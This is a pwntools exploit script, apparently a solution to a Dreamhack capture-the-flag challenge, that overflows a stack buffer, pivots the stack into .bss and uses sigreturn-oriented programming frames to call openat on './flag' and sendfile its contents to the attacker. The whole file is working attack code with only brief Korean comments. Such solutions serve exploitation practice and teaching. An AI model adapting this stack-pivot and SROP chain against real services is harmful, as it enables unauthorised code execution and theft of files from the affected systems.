from pwn import *

p=remote("host3.dreamhack.games",18942)
#p=process("./chall")
e=ELF("./chall")
context.log_level='debug'
context.arch='amd64'


#addr
main=e.symbols["main"]
read=main+28
syscall=main+62
bss=e.bss()
leave=0x401375
pop_rbp=main+65

#openat(AT_FDCWD,"./flag",O_RDONLY);
#openat frame
f1=SigreturnFrame(kernel='amd64')
f1.rax=0x101 #openat
f1.rsp=bss+0x160 #./flag 밑
f1.rbp=bss+0x288 #차피 뒤에 다시 들어감
f1.rdi=0xffffff9c #AT_FDCWD
f1.rsi=bss+0x158 #수정 필요
f1.rdx=0
f1.rip=syscall

#sendfile(1,fd,0,0x30);
#sendfile frame
f2=SigreturnFrame(kernel='amd64')
f2.rax=0x28 #sendfile
f2.rsp=bss+0x40 #아무거나
f2.rdi=1
f2.rsi=3 #디버깅
f2.rdx=0
f2.r10=0x30 #4번째 인자는 r10이다!!
f2.rip=syscall

#stack payload
p1=b'A'*0x10
p1+=p64(bss+0x50)
p1+=p64(read) #p2 읽어서 bss+0x40에 저장
p1+=p64(bss+0x40)
p1+=p64(leave)


#bss payload (Fake Stack)
p2=p64(bss+0x288) #leave로 인해 pop rbp 일어남 (여기는 bss+0x40)
p2+=p64(read)
p2+=p64(bss+0x288) #rbp들어가야할 위치
p2+=p64(syscall)
p2+=bytes(f1) #openat frame (0xf8 bytes)
p2+=b"./flag\x00\x00" #openat rsi위치
p2+=p64(bss+0x288) #openat rsp위치
p2+=p64(read)
p2+=p64(bss+0x288)
p2+=p64(syscall)
p2+=bytes(f2) #sendfile frame
p2+=b'\x00'*0x10


#gdb.attach(p)
p.send(p1)
pause()
p.send(p2)
pause()
p.send(b'B'*15)
pause()
p.send(b'C'*15)

#p.interactive()
